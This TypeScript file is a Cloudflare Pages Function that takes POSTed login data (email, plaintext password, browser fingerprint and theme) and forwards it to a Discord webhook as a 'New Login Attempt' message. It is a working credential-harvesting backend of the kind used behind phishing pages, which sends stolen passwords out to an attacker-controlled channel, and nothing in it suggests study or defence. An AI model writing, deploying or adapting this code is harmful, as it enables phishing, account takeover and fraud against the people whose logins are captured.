import type { PagesFunction } from '@cloudflare/workers-types';

interface Env {
  DISCORD_WEBHOOK_URL: string;
}

// Cloudflare Workers already have fetch and AbortController available.
export const onRequest: PagesFunction<Env> = async ({ request, env }) => {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', { status: 405 });
  }

  let body: any;
  try {
    body = await request.json();
  } catch (err) {
    return new Response('Invalid JSON', { status: 400 });
  }

  const { email, password, fingerprint, theme } = body;
  const webhookUrl = env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) {
    return new Response('Webhook not configured', { status: 500 });
  }

  const payload = {
    embeds: [
      {
        title: 'New Login Attempt',
        color: 0xff4b33,
        fields: [
          { name: 'Email', value: (email || 'N/A').toString().slice(0, 1024), inline: true },
          { name: 'Password', value: (password || 'N/A').toString().slice(0, 1024), inline: true },
          { name: 'Theme', value: (theme || 'Default').toString().slice(0, 1024), inline: true },
          { name: 'Fingerprint', value: `\`\`\`${(fingerprint || 'N/A').toString().slice(0, 1024)}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    const resp = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    return new Response(JSON.stringify({ ok: resp.ok, status: resp.status }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response('Failed to contact Discord', { status: 502 });
  }
};
